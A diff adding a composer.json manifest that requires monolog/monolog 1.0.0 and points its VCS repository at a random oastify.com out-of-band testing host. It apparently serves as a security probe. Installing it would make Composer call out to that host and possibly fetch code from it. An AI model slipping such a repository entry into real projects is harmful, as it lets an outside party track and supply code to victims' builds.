@@ -1,0 +1,6 @@
+{
+  "repositories": [
+    {"type": "vcs", "url": "https://suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/composer-vcs"}
+  ],
+  "require": {"monolog/monolog": "1.0.0"}
+}
